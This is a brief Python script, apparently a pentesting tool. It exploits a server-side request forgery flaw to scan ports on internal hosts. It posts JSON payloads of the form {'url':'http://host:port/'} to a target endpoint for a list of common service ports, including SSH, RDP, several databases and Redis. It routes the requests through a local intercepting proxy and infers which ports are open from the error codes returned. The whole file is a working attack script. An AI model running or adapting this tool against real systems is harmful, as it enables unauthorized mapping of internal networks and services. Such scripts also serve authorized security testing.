#!/usr/bin/python

import argparse
import requests
import time
# take ip range from user. 

ports = ['22','80','443', '1433', '1521', '3306', '3389', '5000', '5432', '5900', '6379','8000','8001','8055','8080','8443','9000']
payload_temp = '{{"url":"http://{host}:{port}/"}}'
proxies = {'http':'http://127.0.0.1:8080'}


parser = argparse.ArgumentParser()
parser.add_argument("-t","--target", help="Type URL", required=True)
parser.add_argument("-s","--ssrf", help = "ssrf targetting", required= True)
parser.add_argument("-i","--ipran", help = "IP range")
parser.add_argument("-v","--verbose", help="enable verbose mode", action="store_true", default=False)
args= parser.parse_args()



for port in ports:
    payload = payload_temp.format(host=args.ssrf,port=port)
    res= requests.post(url=args.target, data=payload, headers={'Content-Type':'application/json'}, proxies=proxies)
    time.sleep(.2)
    if '"code":"INTERNAL_SERVER_ERROR"' in res.text:
        print (port + "   INTERNAL_SERVER_ERROR")
    elif '"code":"FORBIDDEN"' in res.text:
        print (port + "   FORBIDDEN")
    else:
        print (res.text)
